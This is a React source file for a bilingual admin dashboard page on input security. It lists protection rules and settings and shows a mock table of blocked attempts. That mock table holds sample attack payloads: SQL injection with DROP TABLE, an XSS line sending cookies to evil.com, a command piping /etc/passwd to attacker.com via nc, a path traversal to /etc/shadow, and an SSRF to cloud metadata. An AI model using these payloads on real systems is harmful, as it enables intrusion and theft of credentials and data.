'use client'
import { useState, useMemo } from 'react'
import { motion } from 'framer-motion'
import { toast } from 'sonner'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import { Separator } from '@/components/ui/separator'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Shield, ShieldCheck, ShieldAlert, ShieldX, Bug, Code, FileText, Lock, Activity, AlertTriangle, Database, Globe, Mail, Terminal, Fingerprint, Search, RefreshCw, Eye } from 'lucide-react'
import { useSA, StatusBadge, PageTitle, FormField, Toggle, StatCard, KpiCard, ActionBtn, PrimaryBtn, fade, gaugeColor } from './sa-helpers'

type Severity = 'low' | 'medium' | 'high' | 'critical'

interface Rule {
  id: number; name: string; nameEn: string; category: string; categoryEn: string
  enabled: boolean; severity: Severity; blockedAttempts: number; lastTriggered: string | null
}

const RULES: Rule[] = [
  { id: 1, name: 'حقن SQL', nameEn: 'SQL Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'critical', blockedAttempts: 45, lastTriggered: '3 دقائق' },
  { id: 2, name: 'XSS', nameEn: 'XSS', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'critical', blockedAttempts: 38, lastTriggered: '12 دقيقة' },
  { id: 3, name: 'حقن الأوامر', nameEn: 'Command Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'high', blockedAttempts: 12, lastTriggered: '1 ساعة' },
  { id: 4, name: 'حقن LDAP', nameEn: 'LDAP Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'medium', blockedAttempts: 3, lastTriggered: '5 ساعات' },
  { id: 5, name: 'حقن XML', nameEn: 'XML Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'medium', blockedAttempts: 2, lastTriggered: 'يومين' },
  { id: 6, name: 'حقن NoSQL', nameEn: 'NoSQL Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'medium', blockedAttempts: 5, lastTriggered: '8 ساعات' },
  { id: 7, name: 'حقن HTML', nameEn: 'HTML Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'high', blockedAttempts: 15, lastTriggered: '30 دقيقة' },
  { id: 8, name: 'حقن البريد', nameEn: 'Email Injection', category: 'حقن', categoryEn: 'Injection', enabled: true, severity: 'low', blockedAttempts: 1, lastTriggered: null },
  { id: 9, name: 'CSRF', nameEn: 'CSRF', category: 'مصادقة', categoryEn: 'Authentication', enabled: true, severity: 'high', blockedAttempts: 22, lastTriggered: '45 دقيقة' },
  { id: 10, name: 'تعيين كتلي', nameEn: 'Mass Assignment', category: 'مصادقة', categoryEn: 'Authentication', enabled: true, severity: 'medium', blockedAttempts: 8, lastTriggered: '3 ساعات' },
  { id: 11, name: 'العبث بالمعاملات', nameEn: 'Parameter Tampering', category: 'مصادقة', categoryEn: 'Authentication', enabled: true, severity: 'high', blockedAttempts: 18, lastTriggered: '1 ساعة' },
  { id: 12, name: 'استغلال رفع الملفات', nameEn: 'File Upload Exploits', category: 'بيانات', categoryEn: 'Data', enabled: true, severity: 'high', blockedAttempts: 7, lastTriggered: '2 ساعة' },
  { id: 13, name: 'اجتياز المسار', nameEn: 'Path Traversal', category: 'بيانات', categoryEn: 'Data', enabled: true, severity: 'high', blockedAttempts: 9, lastTriggered: '4 ساعات' },
  { id: 14, name: 'SSRF', nameEn: 'SSRF', category: 'بيانات', categoryEn: 'Data', enabled: true, severity: 'high', blockedAttempts: 4, lastTriggered: '6 ساعات' },
  { id: 15, name: 'إعادة توجيه مفتوحة', nameEn: 'Open Redirect', category: 'بيانات', categoryEn: 'Data', enabled: true, severity: 'medium', blockedAttempts: 6, lastTriggered: '5 ساعات' },
  { id: 16, name: 'تجاوز السعة', nameEn: 'Overflow', category: 'معدل وروبوت', categoryEn: 'Rate & Bot', enabled: true, severity: 'medium', blockedAttempts: 0, lastTriggered: null },
  { id: 17, name: 'تحديد المعدل', nameEn: 'Rate Limiting', category: 'معدل وروبوت', categoryEn: 'Rate & Bot', enabled: true, severity: 'high', blockedAttempts: 156, lastTriggered: '5 دقائق' },
  { id: 18, name: 'حماية البوت', nameEn: 'Bot Protection', category: 'معدل وروبوت', categoryEn: 'Rate & Bot', enabled: true, severity: 'medium', blockedAttempts: 89, lastTriggered: '10 دقائق' },
  { id: 19, name: 'كابتشا', nameEn: 'Captcha', category: 'معدل وروبوت', categoryEn: 'Rate & Bot', enabled: false, severity: 'low', blockedAttempts: 0, lastTriggered: null },
  { id: 20, name: 'تنقية المدخلات', nameEn: 'Input Sanitization', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'critical', blockedAttempts: 234, lastTriggered: '1 دقيقة' },
  { id: 21, name: 'ترميز المخرجات', nameEn: 'Output Encoding', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'critical', blockedAttempts: 0, lastTriggered: null },
  { id: 22, name: 'التحقق بالقائمة البيضاء', nameEn: 'Whitelist Validation', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'high', blockedAttempts: 45, lastTriggered: '20 دقيقة' },
  { id: 23, name: 'التحقق من الطول', nameEn: 'Length Validation', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'medium', blockedAttempts: 67, lastTriggered: '15 دقيقة' },
  { id: 24, name: 'التحقق من النوع', nameEn: 'Type Validation', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'medium', blockedAttempts: 34, lastTriggered: '2 ساعة' },
  { id: 25, name: 'التحقق من الخادم', nameEn: 'Server-side Validation', category: 'تحقق', categoryEn: 'Validation', enabled: true, severity: 'critical', blockedAttempts: 0, lastTriggered: null },
]

const BLOCKED: { ts: string; type: string; typeEn: string; ip: string; endpoint: string; payload: string; severity: Severity }[] = [
  { ts: '10:42:18', type: 'حقن SQL', typeEn: 'SQL Injection', ip: '192.168.1.105', endpoint: '/api/auth/login', payload: "' OR 1=1 -- DROP TABLE users;", severity: 'critical' },
  { ts: '10:38:05', type: 'XSS', typeEn: 'XSS', ip: '10.0.0.33', endpoint: '/api/posts/comment', payload: '<script>document.location="https://evil.com/?c="+document.cookie</script>', severity: 'critical' },
  { ts: '10:35:41', type: 'حقن الأوامر', typeEn: 'Command Injection', ip: '172.16.0.12', endpoint: '/api/tools/ping', payload: '; cat /etc/passwd | nc attacker.com 4444', severity: 'high' },
  { ts: '10:29:12', type: 'اجتياز المسار', typeEn: 'Path Traversal', ip: '192.168.2.88', endpoint: '/api/files/download', payload: '../../etc/shadow', severity: 'high' },
  { ts: '10:22:50', type: 'SSRF', typeEn: 'SSRF', ip: '10.0.1.7', endpoint: '/api/proxy/fetch', payload: 'http://169.254.169.254/latest/meta-data/', severity: 'high' },
]

const SEV: Record<Severity, { cls: string }> = {
  critical: { cls: 'bg-red-100 text-red-700 dark:bg-red-950/40 dark:text-red-400' },
  high: { cls: 'bg-orange-100 text-orange-700 dark:bg-orange-950/40 dark:text-orange-400' },
  medium: { cls: 'bg-amber-100 text-amber-700 dark:bg-amber-950/40 dark:text-amber-400' },
  low: { cls: 'bg-sky-100 text-sky-700 dark:bg-sky-950/40 dark:text-sky-400' },
}

const FILTERS = ['all', 'injection', 'authentication', 'data', 'rate', 'validation'] as const
type Filter = typeof FILTERS[number]

const FILTER_LABELS: Record<Filter, { ar: string; en: string }> = {
  all: { ar: 'الكل', en: 'All' },
  injection: { ar: 'حقن', en: 'Injection' },
  authentication: { ar: 'مصادقة', en: 'Authentication' },
  data: { ar: 'بيانات', en: 'Data' },
  rate: { ar: 'معدل/روبوت', en: 'Rate/Bot' },
  validation: { ar: 'تحقق', en: 'Validation' },
}

const FILTER_CAT_MAP: Record<string, { ar: string; en: string }> = {
  injection: { ar: 'حقن', en: 'Injection' },
  authentication: { ar: 'مصادقة', en: 'Authentication' },
  data: { ar: 'بيانات', en: 'Data' },
  rate: { ar: 'معدل وروبوت', en: 'Rate & Bot' },
  validation: { ar: 'تحقق', en: 'Validation' },
}

export function InputSecurityPage() {
  const { t, isRTL, lang } = useSA()
  const [filter, setFilter] = useState<Filter>('all')
  const [search, setSearch] = useState('')
  const [rules, setRules] = useState<Rule[]>(RULES)
  const [cfg, setCfg] = useState({
    maxLen: '10000', rateLimit: '60', maxFileMB: '10',
    fileTypes: 'pdf,doc,xls,jpg,png,svg', captcha: 'recaptcha_v3', outputEnc: true,
  })

  const l = (ar: string, en: string) => lang === 'ar' ? ar : en

  const toggleRule = (id: number) =>
    setRules(p => p.map(r => r.id === id ? { ...r, enabled: !r.enabled } : r))

  const filtered = useMemo(() => {
    let result = rules
    if (filter !== 'all') {
      const cat = FILTER_CAT_MAP[filter]
      result = result.filter(r => r.category === cat.ar || r.categoryEn === cat.en)
    }
    if (search.trim()) {
      const q = search.toLowerCase()
      result = result.filter(r => r.name.toLowerCase().includes(q) || r.nameEn.toLowerCase().includes(q))
    }
    return result
  }, [rules, filter, search])

  const grouped = useMemo(() => {
    const map = new Map<string, Rule[]>()
    filtered.forEach(r => {
      const k = lang === 'ar' ? r.category : r.categoryEn
      if (!map.has(k)) map.set(k, [])
      map.get(k)!.push(r)
    })
    return map
  }, [filtered, lang])

  const activeCount = rules.filter(r => r.enabled).length
  const totalBlocked = rules.reduce((s, r) => s + r.blockedAttempts, 0)

  return (
    <div className="space-y-5">
      {/* Page Header */}
      <PageTitle
        title={l('أمان المدخلات', 'Input Security')}
        action={
          <ActionBtn
            icon={RefreshCw}
            label={l('تحديث', 'Refresh')}
            onClick={() => toast.success(l('تم التحديث', 'Refreshed'))}
          />
        }
      />

      {/* ── 1. KPI Row ── */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={ShieldCheck} label={l('الحمايات النشطة', 'Active Protections')} value={`${activeCount}/${rules.length}`} color="bg-emerald-500" />
        <StatCard icon={ShieldAlert} label={l('محاولات محظورة (24 ساعة)', 'Blocked Attempts (24h)')} value={String(totalBlocked)} color="bg-red-500" />
        <StatCard icon={Shield} label={l('القواعد النشطة', 'Rules Active')} value={String(activeCount)} color="bg-violet-500" />
        <StatCard icon={AlertTriangle} label={l('آخر حادثة', 'Last Incident')} value={l('منذ ساعتين', '2 hours ago')} color="bg-amber-500" />
      </div>

      {/* ── 2. Protection Rules Table ── */}
      <motion.div variants={fade} initial="hidden" animate="visible">
        <Card className="border-0 shadow-sm">
          <CardHeader className="pb-3">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
              <CardTitle className="text-base">{l('قواعد الحماية', 'Protection Rules')}</CardTitle>
              <div className="flex flex-wrap gap-2">
                {FILTERS.map(f => (
                  <Button
                    key={f}
                    size="sm"
                    variant={filter === f ? 'default' : 'outline'}
                    className={filter === f ? 'bg-violet-600 hover:bg-violet-700 text-white text-xs h-8' : 'text-xs h-8'}
                    onClick={() => setFilter(f)}
                  >
                    {FILTER_LABELS[f][lang]}
                  </Button>
                ))}
              </div>
            </div>
            {/* Search */}
            <div className="relative mt-3 max-w-sm">
              <Search className={`absolute top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground ${isRTL ? 'right-3' : 'left-3'}`} />
              <Input
                placeholder={l('بحث في القواعد...', 'Search rules...')}
                value={search}
                onChange={e => setSearch(e.target.value)}
                className={isRTL ? 'pr-9 h-9 text-sm' : 'pl-9 h-9 text-sm'}
              />
            </div>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto max-h-[480px] overflow-y-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('القاعدة', 'Rule')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('الفئة', 'Category')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('الخطورة', 'Severity')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider text-center">{l('محظور', 'Blocked')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('آخر تفعيل', 'Last Triggered')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider text-center">{l('الحالة', 'Status')}</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filtered.length === 0 && (
                    <TableRow>
                      <TableCell colSpan={6} className="h-32 text-center text-sm text-muted-foreground">
                        {l('لا توجد نتائج', 'No results found')}
                      </TableCell>
                    </TableRow>
                  )}
                  {Array.from(grouped.entries()).map(([cat, catRules]) => (
                    <GroupedRows key={cat} category={cat} rules={catRules} lang={lang} onToggle={toggleRule} />
                  ))}
                </TableBody>
              </Table>
            </div>
            {/* Summary footer */}
            <div className="border-t px-5 py-3 text-xs text-muted-foreground bg-muted/20">
              {l('عرض', 'Showing')} {filtered.length} / {rules.length} {l('قاعدة', 'rules')}
            </div>
          </CardContent>
        </Card>
      </motion.div>

      {/* ── 3. Configuration ── */}
      <motion.div variants={fade} initial="hidden" animate="visible">
        <Card className="border-0 shadow-sm">
          <CardHeader className="pb-3">
            <CardTitle className="text-base">{l('إعدادات الأمان', 'Security Configuration')}</CardTitle>
          </CardHeader>
          <CardContent dir={isRTL ? 'rtl' : 'ltr'}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <FormField label={l('الحد الأقصى لطول المدخل', 'Max Input Length')}>
                <Input type="number" value={cfg.maxLen} onChange={e => setCfg(p => ({ ...p, maxLen: e.target.value }))} />
              </FormField>
              <FormField label={l('حد المعدل في الدقيقة', 'Rate Limit per Minute')}>
                <Input type="number" value={cfg.rateLimit} onChange={e => setCfg(p => ({ ...p, rateLimit: e.target.value }))} />
              </FormField>
              <FormField label={l('الحد الأقصى لحجم الملف (ميغابايت)', 'Max File Size MB')}>
                <Input type="number" value={cfg.maxFileMB} onChange={e => setCfg(p => ({ ...p, maxFileMB: e.target.value }))} />
              </FormField>
              <FormField label={l('أنواع الملفات المسموحة', 'Allowed File Types')}>
                <Input value={cfg.fileTypes} onChange={e => setCfg(p => ({ ...p, fileTypes: e.target.value }))} />
              </FormField>
              <FormField label={l('نوع الكابتشا', 'Captcha Type')}>
                <Select value={cfg.captcha} onValueChange={v => setCfg(p => ({ ...p, captcha: v }))}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="recaptcha_v2">reCAPTCHA v2</SelectItem>
                    <SelectItem value="recaptcha_v3">reCAPTCHA v3</SelectItem>
                    <SelectItem value="hcaptcha">hCaptcha</SelectItem>
                    <SelectItem value="none">{l('بدون', 'None')}</SelectItem>
                  </SelectContent>
                </Select>
              </FormField>
              <FormField label={l('ترميز المخرجات', 'Output Encoding')}>
                <div className="flex items-center gap-3 pt-1">
                  <Toggle on={cfg.outputEnc} onToggle={() => setCfg(p => ({ ...p, outputEnc: !p.outputEnc }))} />
                  <span className="text-sm text-muted-foreground">
                    {cfg.outputEnc ? l('مفعّل — كيانات HTML', 'Enabled — HTML Entities') : l('معطّل', 'Disabled')}
                  </span>
                </div>
              </FormField>
            </div>
            <Separator className="my-5" />
            <div className="flex justify-end">
              <PrimaryBtn
                icon={Lock}
                label={t.save}
                onClick={() => toast.success(l('تم حفظ الإعدادات بنجاح', 'Configuration saved successfully'))}
              />
            </div>
          </CardContent>
        </Card>
      </motion.div>

      {/* ── 4. Validation Layers ── */}
      <div>
        <h3 className="text-sm font-semibold mb-3">{l('طبقات التحقق', 'Validation Layers')}</h3>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          {([
            {
              icon: Code,
              titleAr: 'التحقق من العميل',
              titleEn: 'Client-side Validation',
              enabled: true,
              ruleCount: 12,
              typeAr: 'HTML5 / JS',
              typeEn: 'HTML5 / JS',
              descAr: 'التحقق من المدخلات في المتصفح قبل الإرسال لتوفير تجربة مستخدم سريعة وسلسة',
              descEn: 'Browser-side input validation before submission for fast and smooth user experience',
            },
            {
              icon: Terminal,
              titleAr: 'التحقق من الخادم',
              titleEn: 'Server-side Validation',
              enabled: true,
              ruleCount: 18,
              typeAr: 'Node.js / Prisma',
              typeEn: 'Node.js / Prisma',
              descAr: 'التحقق الشامل على الخادم كخط دفاع أخير ضد البيانات الضارة والمعالجة غير المصرح بها',
              descEn: 'Comprehensive server validation as the last line of defense against malicious data and unauthorized processing',
            },
            {
              icon: ShieldCheck,
              titleAr: 'ترميز المخرجات',
              titleEn: 'Output Encoding',
              enabled: true,
              ruleCount: 8,
              typeAr: 'كيانات HTML',
              typeEn: 'HTML Entities',
              descAr: 'تحويل كيانات HTML تلقائياً لمنع تنفيذ الأكواد الضارة في واجهة المستخدم',
              descEn: 'Automatic HTML entity encoding to prevent malicious code execution in the user interface',
            },
          ] as const).map((layer, i) => (
            <motion.div key={i} variants={fade} initial="hidden" animate="visible" transition={{ delay: i * 0.08 }}>
              <Card className="border-0 shadow-sm h-full">
                <CardContent className="p-5 space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-violet-100 dark:bg-violet-950/40">
                        <layer.icon className="h-4 w-4 text-violet-600" />
                      </div>
                      <span className="font-semibold text-sm">{lang === 'ar' ? layer.titleAr : layer.titleEn}</span>
                    </div>
                    <Toggle
                      on={layer.enabled}
                      onToggle={() => toast.success(l('تم تحديث الطبقة', 'Layer updated'))}
                    />
                  </div>
                  <div className="flex items-center gap-2">
                    <Badge variant="outline" className="text-xs">{layer.ruleCount} {l('قاعدة', 'rules')}</Badge>
                    <Badge className="text-[10px] bg-violet-100 text-violet-700 dark:bg-violet-950/40 dark:text-violet-400 border-0">
                      {lang === 'ar' ? layer.typeAr : layer.typeEn}
                    </Badge>
                    <Badge className="bg-emerald-100 text-emerald-700 dark:bg-emerald-950/40 dark:text-emerald-400 text-xs border-0">
                      {l('نشط', 'Active')}
                    </Badge>
                  </div>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    {lang === 'ar' ? layer.descAr : layer.descEn}
                  </p>
                </CardContent>
              </Card>
            </motion.div>
          ))}
        </div>
      </div>

      {/* ── 5. Recent Blocked Attempts ── */}
      <motion.div variants={fade} initial="hidden" animate="visible">
        <Card className="border-0 shadow-sm">
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <CardTitle className="text-base">{l('محاولات الحظر الأخيرة', 'Recent Blocked Attempts')}</CardTitle>
              <Badge className="bg-red-100 text-red-700 dark:bg-red-950/40 dark:text-red-400 border-0 text-xs">
                {BLOCKED.length} {l('محاولة اليوم', 'attempts today')}
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('الوقت', 'Timestamp')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('النوع', 'Type')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('عنوان IP', 'Source IP')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('النقطة المستهدفة', 'Endpoint')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('الحمولة', 'Payload')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider">{l('الخطورة', 'Severity')}</TableHead>
                    <TableHead className="font-semibold text-xs uppercase tracking-wider text-center">{l('الحالة', 'Status')}</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {BLOCKED.map((b, i) => (
                    <TableRow key={i}>
                      <TableCell className="text-xs font-mono whitespace-nowrap">{b.ts}</TableCell>
                      <TableCell className="text-xs font-medium">{lang === 'ar' ? b.type : b.typeEn}</TableCell>
                      <TableCell className="text-xs font-mono">{b.ip}</TableCell>
                      <TableCell className="text-xs font-mono">{b.endpoint}</TableCell>
                      <TableCell className="text-xs max-w-[200px] truncate" title={b.payload}>
                        {b.payload}...
                      </TableCell>
                      <TableCell>
                        <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[10px] font-semibold ${SEV[b.severity].cls}`}>
                          {b.severity.toUpperCase()}
                        </span>
                      </TableCell>
                      <TableCell className="text-center">
                        <Badge className="bg-red-100 text-red-700 dark:bg-red-950/40 dark:text-red-400 border-0 text-[10px]">
                          {l('محظور', 'Blocked')}
                        </Badge>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </motion.div>
    </div>
  )
}

/* ── Grouped Table Rows ── */
function GroupedRows({
  category, rules, lang, onToggle,
}: {
  category: string; rules: Rule[]; lang: 'ar' | 'en'; onToggle: (id: number) => void
}) {
  const l = (ar: string, en: string) => lang === 'ar' ? ar : en

  return (
    <>
      {/* Category header row */}
      <TableRow className="bg-violet-50 dark:bg-violet-950/20 hover:bg-violet-50 dark:hover:bg-violet-950/20">
        <TableCell colSpan={6} className="font-semibold text-sm text-violet-700 dark:text-violet-300 py-2">
          <Shield className="inline h-3.5 w-3.5 me-2" />
          {category} ({rules.length})
        </TableCell>
      </TableRow>
      {rules.map(r => (
        <TableRow key={r.id}>
          <TableCell className="text-sm font-medium">
            {lang === 'ar' ? r.name : r.nameEn}
          </TableCell>
          <TableCell>
            <Badge variant="outline" className="text-[10px]">
              {lang === 'ar' ? r.category : r.categoryEn}
            </Badge>
          </TableCell>
          <TableCell>
            <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[10px] font-semibold ${SEV[r.severity].cls}`}>
              {r.severity.toUpperCase()}
            </span>
          </TableCell>
          <TableCell className="text-center text-sm font-mono">{r.blockedAttempts}</TableCell>
          <TableCell className="text-xs text-muted-foreground">
            {r.lastTriggered ?? l('لم يُفعّل', 'Never')}
          </TableCell>
          <TableCell className="text-center">
            <Toggle on={r.enabled} onToggle={() => onToggle(r.id)} />
          </TableCell>
        </TableRow>
      ))}
    </>
  )
}